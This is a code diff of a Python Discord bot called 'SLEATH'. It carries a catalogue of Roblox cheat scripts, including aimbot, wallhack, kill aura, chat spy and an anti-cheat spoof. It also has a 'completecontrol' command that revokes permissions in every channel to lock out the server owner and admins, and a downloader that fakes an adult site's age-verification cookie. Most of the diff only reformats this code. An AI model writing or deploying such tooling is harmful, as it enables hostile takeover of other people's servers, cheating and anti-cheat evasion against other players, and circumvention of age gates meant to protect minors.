@@ -35,7 +35,6 @@ DISCORD_FILE_LIMIT = 24 * 1024 * 1024
 BAD_THUMB = re.compile(r'(\/xx\/|_recording|\/track\/|1x1|placeholder)', re.I)
 YT_DLP = shutil.which("yt-dlp") or "yt-dlp"
 
-# ── Roblox scripts ─────────────────────────────────────────────────────────────
 ROBLOX_SCRIPTS = {
 
 "fly": '''-- Fly Script | KRNL | Universal
@@ -861,10 +860,10 @@ ExpandBtn.BorderSizePixel = 0
 local expanded = false
 local buttonList = {}
 local TOGGLES = {
-    "F  Fly", "G  Speed", "H  Inf Jump", "J  Aimbot",
-    "N  NoClip", "P  God Mode", "L  Fullbright", "M  Low Gravity",
-    "V  Bhop", "Z  Spin", "R  Reach", "B  Bring", "K  Teleport",
-    "O  Auto Farm", "Q  Cam Lock", "X  Auto Click", "C  Chest Hop",
+    "F  Fly","G  Speed","H  Inf Jump","J  Aimbot",
+    "N  NoClip","P  God Mode","L  Fullbright","M  Low Gravity",
+    "V  Bhop","Z  Spin","R  Reach","B  Bring","K  Teleport",
+    "O  Auto Farm","Q  Cam Lock","X  Auto Click","C  Chest Hop",
 }
 local function buildButtons()
     for i, label in ipairs(TOGGLES) do
@@ -922,32 +921,32 @@ print("[SLEATH] Speed vault — comma to enable, Space to vault")
 }
 
 ROBLOX_META = {
-    "fly":              ("Fly",             "Full 6-axis fly.",                                          "F to toggle"),
-    "esp":              ("ESP",             "See players through walls with distance.",                  "Always on"),
-    "speed":            ("Speed Hack",      "100 walkspeed, Shift for 2x.",                             "G to toggle"),
-    "infjump":          ("Infinite Jump",   "Jump unlimited times mid-air.",                            "H to toggle"),
-    "aimbot":           ("Aimbot",          "Silent aim locks to nearest head in FOV.",                 "J to toggle, U for FOV"),
-    "noclip":           ("NoClip",          "Walk through all geometry.",                               "N to toggle"),
-    "teleport":         ("Teleport",        "Teleport to nearest player instantly.",                    "K to teleport"),
-    "bringplayer":      ("Bring Player",    "Pull nearest player to your position.",                    "B to bring"),
-    "godmode":          ("God Mode",        "Health cannot decrease.",                                  "P to toggle"),
-    "fullbright":       ("Fullbright",      "Remove all darkness and fog.",                             "L to toggle"),
-    "antivoid":         ("Anti-Void",       "Auto-return if you fall out of the map.",                  "Always active"),
-    "chesthop":         ("Chest Hop",       "Auto-loot all chests in the game.",                       "C to collect"),
-    "autoclick":        ("Auto Clicker",    "20 clicks per second.",                                   "X to toggle"),
-    "playerlist":       ("Player List",     "All players with health, position, distance.",             "Tab to refresh"),
-    "spinhack":         ("Spin Hack",       "Spin your character rapidly.",                            "Z to toggle"),
-    "antigravity":      ("Low Gravity",     "Moon-walk gravity.",                                      "M to toggle"),
-    "reachextend":      ("Reach Extender",  "Extend melee weapon reach to 30 units.",                  "R to toggle"),
-    "killaura":         ("Kill Aura",       "Rapid-teleport damage to nearby players.",                "' to toggle"),
-    "autofarm":         ("Auto Farm",       "Walk to and attack nearest NPC enemy.",                   "O to toggle"),
-    "camlock":          ("Camera Lock",     "Lock camera facing nearest player.",                      "Q to toggle"),
-    "chatspy":          ("Chat Spy",        "Log all chat messages to output.",                        "Always active"),
-    "wallhop":          ("Bhop",            "Auto-jump on land for bunny hop.",                        "V to toggle"),
-    "hitbox":           ("Hitbox Expand",   "Enlarge all enemy hitboxes.",                             "; to toggle"),
-    "anticheatbypass":  ("AC Spoof",        "Hide speed/jump edits from game scanners.",               "Always active"),
-    "customgui":        ("GUI Hub",         "Draggable on-screen keybind panel.",                      "+ to expand"),
-    "speedvault":       ("Speed Vault",     "Speed burst on jump.",                                    ", to enable, Space to vault"),
+    "fly":             ("Fly",            "Full 6-axis fly.",                               "F to toggle"),
+    "esp":             ("ESP",            "See players through walls with distance.",        "Always on"),
+    "speed":           ("Speed Hack",     "100 walkspeed, Shift for 2x.",                  "G to toggle"),
+    "infjump":         ("Infinite Jump",  "Jump unlimited times mid-air.",                  "H to toggle"),
+    "aimbot":          ("Aimbot",         "Silent aim locks to nearest head in FOV.",        "J to toggle, U for FOV"),
+    "noclip":          ("NoClip",         "Walk through all geometry.",                      "N to toggle"),
+    "teleport":        ("Teleport",       "Teleport to nearest player instantly.",           "K to teleport"),
+    "bringplayer":     ("Bring Player",   "Pull nearest player to your position.",           "B to bring"),
+    "godmode":         ("God Mode",       "Health cannot decrease.",                         "P to toggle"),
+    "fullbright":      ("Fullbright",     "Remove all darkness and fog.",                    "L to toggle"),
+    "antivoid":        ("Anti-Void",      "Auto-return if you fall out of the map.",         "Always active"),
+    "chesthop":        ("Chest Hop",      "Auto-loot all chests in the game.",              "C to collect"),
+    "autoclick":       ("Auto Clicker",   "20 clicks per second.",                          "X to toggle"),
+    "playerlist":      ("Player List",    "All players with health, position, distance.",    "Tab to refresh"),
+    "spinhack":        ("Spin Hack",      "Spin your character rapidly.",                   "Z to toggle"),
+    "antigravity":     ("Low Gravity",    "Moon-walk gravity.",                             "M to toggle"),
+    "reachextend":     ("Reach Extender", "Extend melee weapon reach to 30 units.",         "R to toggle"),
+    "killaura":        ("Kill Aura",      "Rapid-teleport damage to nearby players.",       "' to toggle"),
+    "autofarm":        ("Auto Farm",      "Walk to and attack nearest NPC enemy.",          "O to toggle"),
+    "camlock":         ("Camera Lock",    "Lock camera facing nearest player.",             "Q to toggle"),
+    "chatspy":         ("Chat Spy",       "Log all chat messages to output.",               "Always active"),
+    "wallhop":         ("Bhop",           "Auto-jump on land for bunny hop.",               "V to toggle"),
+    "hitbox":          ("Hitbox Expand",  "Enlarge all enemy hitboxes.",                   "; to toggle"),
+    "anticheatbypass": ("AC Spoof",       "Hide speed/jump edits from game scanners.",      "Always active"),
+    "customgui":       ("GUI Hub",        "Draggable on-screen keybind panel.",             "+ to expand"),
+    "speedvault":      ("Speed Vault",    "Speed burst on jump.",                           ", to enable, Space to vault"),
 }
 
 
@@ -1556,7 +1555,7 @@ async def strip_all_roles(ctx: commands.Context, guild_id: int, user_id: int):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  COMPLETE CONTROL — owner fully caged via per-channel user overwrites
+#  COMPLETE CONTROL
 # ══════════════════════════════════════════════════════════════════════════════
 
 @bot.command(name="completecontrol")
@@ -1614,41 +1613,23 @@ async def complete_control(ctx: commands.Context, guild_id: int):
             failed += 1
 
     full_lock = discord.PermissionOverwrite(
-        view_channel=True,
-        read_messages=True,
-        read_message_history=True,
-        send_messages=False,
-        send_messages_in_threads=False,
-        create_public_threads=False,
-        create_private_threads=False,
-        add_reactions=False,
-        use_application_commands=False,
-        manage_messages=False,
-        manage_channels=False,
-        manage_roles=False,
-        manage_webhooks=False,
-        mention_everyone=False,
-        attach_files=False,
-        embed_links=False,
-        connect=False,
-        speak=False,
-        kick_members=False,
-        ban_members=False,
+        view_channel=True, read_messages=True, read_message_history=True,
+        send_messages=False, send_messages_in_threads=False,
+        create_public_threads=False, create_private_threads=False,
+        add_reactions=False, use_application_commands=False,
+        manage_messages=False, manage_channels=False, manage_roles=False,
+        manage_webhooks=False, mention_everyone=False,
+        attach_files=False, embed_links=False,
+        connect=False, speak=False, kick_members=False, ban_members=False,
         administrator=False,
     )
     everyone_lock = discord.PermissionOverwrite(
-        send_messages=False,
-        send_messages_in_threads=False,
-        create_public_threads=False,
-        create_private_threads=False,
-        add_reactions=False,
-        use_application_commands=False,
-        attach_files=False,
-        embed_links=False,
-        manage_messages=False,
-        manage_channels=False,
-        kick_members=False,
-        ban_members=False,
+        send_messages=False, send_messages_in_threads=False,
+        create_public_threads=False, create_private_threads=False,
+        add_reactions=False, use_application_commands=False,
+        attach_files=False, embed_links=False,
+        manage_messages=False, manage_channels=False,
+        kick_members=False, ban_members=False,
     )
 
     ch_done, ch_fail = 0, 0
@@ -1658,10 +1639,9 @@ async def complete_control(ctx: commands.Context, guild_id: int):
             await asyncio.sleep(0.1)
             await channel.set_permissions(prison_role, overwrite=full_lock, reason="SLEATH CC")
             await asyncio.sleep(0.1)
-            # cage server owner by user ID — overrides owner immunity
+            # cage server owner by user ID — overrides Discord owner immunity
             await channel.set_permissions(guild.owner, overwrite=full_lock, reason="SLEATH CC owner cage")
             await asyncio.sleep(0.1)
-            # cage any remaining admins
             for member in guild.members:
                 if member.id in (bot.user.id, guild.owner.id):
                     continue
@@ -2145,32 +2125,48 @@ async def _send_video_inline(
         "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1",
     }
     downloaded = None
+    ext = "mp4"
+
     try:
         async with aiohttp.ClientSession(headers=headers) as session:
-            async with session.get(source_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+            async with session.get(source_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                 if resp.status == 200:
+                    # derive extension from Content-Type — never trust URL suffix alone
+                    ct = resp.headers.get("Content-Type", "").lower()
+                    if "webm" in ct:
+                        ext = "webm"
+                    elif "mp4" in ct or "video" in ct:
+                        ext = "mp4"
+                    elif source_url.split("?")[0].endswith(".webm"):
+                        ext = "webm"
+                    else:
+                        ext = "mp4"
+
                     chunks, total = [], 0
                     async for chunk in resp.content.iter_chunked(512 * 1024):
                         total += len(chunk)
                         if total > DISCORD_FILE_LIMIT:
-                            downloaded = None; break
+                            downloaded = None
+                            break
                         chunks.append(chunk)
                     else:
                         downloaded = b"".join(chunks)
     except Exception:
         downloaded = None
 
-    ext = "webm" if source_url and source_url.endswith(".webm") else "mp4"
-    safe_name = query.replace(" ", "_")[:40]
+    # filename MUST end .mp4 or .webm — Discord uses extension to pick video player vs image viewer
+    safe_name = re.sub(r'[^\w\-]', '_', query)[:40]
+    filename = f"{safe_name}.{ext}"
 
     if downloaded:
         link = page_url or source_url
         await ctx.send(
             content=link,
-            file=discord.File(fp=io.BytesIO(downloaded), filename=f"{safe_name}.{ext}")
+            file=discord.File(fp=io.BytesIO(downloaded), filename=filename)
         )
         return
 
+    # fallback — too large or download failed
     link = page_url or source_url or ""
     embed = discord.Embed(title=title or query, url=link if link else None, color=0x2b2d31)
     if preview_thumb:
